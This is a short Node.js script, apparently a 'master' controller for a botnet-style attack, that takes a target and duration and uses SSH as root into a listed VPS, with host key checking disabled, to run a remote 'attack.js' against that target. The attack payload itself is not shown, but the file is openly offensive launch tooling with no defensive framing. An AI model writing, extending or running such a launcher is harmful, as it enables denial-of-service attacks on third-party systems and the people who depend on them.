const { exec } = require('child_process');

const hosts = [
  'root@209.127.252.42 -p 22022',
];

const target = process.argv[2];
const duration = process.argv[3];

if (!target || !duration) {
  console.error('Usage: node master.js <target> <duration>');
  process.exit(1);
}

console.log(`Launching attack on ${target} from ${hosts.length} VPS(s) for ${duration}s...`);

hosts.forEach((host) => {
  const cmd = `ssh -o StrictHostKeyChecking=no ${host} "node ~/mybot/attack.js ${target} ${duration}"`;
  exec(cmd, (err, stdout, stderr) => {
    if (err) {
      console.error(`[${host}] Failed: ${err.message}`);
    } else {
      console.log(`[${host}] Launched`);
    }
  });
});
